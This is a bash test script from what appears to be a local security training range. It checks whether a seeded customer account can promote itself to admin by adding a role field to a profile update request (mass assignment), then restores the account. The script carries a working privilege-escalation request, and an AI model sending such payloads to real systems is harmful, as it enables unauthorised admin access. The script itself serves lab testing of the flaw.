#!/usr/bin/env bash
# VULN-MASS-01 — confirm mass assignment on profile update (customer -> admin).
# Restores alice's role afterwards. Local range, seeded fake data.
set -eu
cd "$(dirname "$0")/.."
. ./_lib.sh

need curl
guard_localhost
require_store

echo "VULN-MASS-01 — can alice set her own role to admin via the profile update?"
hr

token=$(login alice@duckstore.test password1)
[ -n "$token" ] || { echo "Login failed (is the range seeded?)." >&2; exit 2; }

# The form only offers a display name; we add a role field by hand. The response re-issues the
# user record, so the stored role is visible in it directly.
resp=$(curl -s -m 10 -X PUT "$STORE/api/auth/profile" \
    -H "Authorization: Bearer $token" -H 'Content-Type: application/json' \
    -d '{"displayName":"Alice Anders","role":"admin"}')
role=$(printf '%s' "$resp" | sed -n 's/.*"role":"\([^"]*\)".*/\1/p')
echo "alice's role after the update: ${role:-<unknown>}"

if [ "$role" = "admin" ]; then
    echo "VULNERABLE: a customer promoted themselves to admin (mass assignment)."
    # Put it back so the range isn't left with alice as admin (needs a fresh token for the new role).
    admin=$(printf '%s' "$resp" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
    curl -s -m 10 -X PUT "$STORE/api/auth/profile" -H "Authorization: Bearer ${admin:-$token}" \
        -H 'Content-Type: application/json' -d '{"displayName":"Alice Anders","role":"customer"}' >/dev/null
    echo "  (restored alice to 'customer')."
    echo "  → Flip VULN-MASS-01 to secure in Range Control and re-run; role stays 'customer'."
elif [ "$role" = "customer" ]; then
    echo "SECURE: the role field was ignored. Only the display name is bound."
else
    echo "Unexpected role ($role). Is the range running and seeded?"
fi
